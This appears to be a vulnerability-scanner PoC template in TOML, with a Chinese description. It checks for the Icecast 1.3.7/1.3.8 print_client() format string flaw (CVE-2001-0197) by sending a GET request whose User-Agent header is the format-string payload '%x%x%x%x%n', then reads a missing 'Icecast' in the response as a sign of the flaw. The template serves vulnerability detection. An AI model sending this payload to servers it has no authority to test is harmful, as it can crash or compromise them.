[info]
author = "ave"
description = "通过发送包含格式字符串说明符的 User-Agent 头部触发 Icecast 服务器 print_client() 函数的格式字符串漏洞，验证目标是否存在该远程代码执行漏洞。"
id = "POC-AVE-2001-0075"
name = "Icecast 1.3.7/1.3.8 print_client() Format String PoC"
severity = "critical"
tags = ["ave-2001-0075"]
vuln_id = [
    "CVE-2001-0197",
    "AVE-2001-0075",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
User-Agent = "%x%x%x%x%n"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["Icecast"]
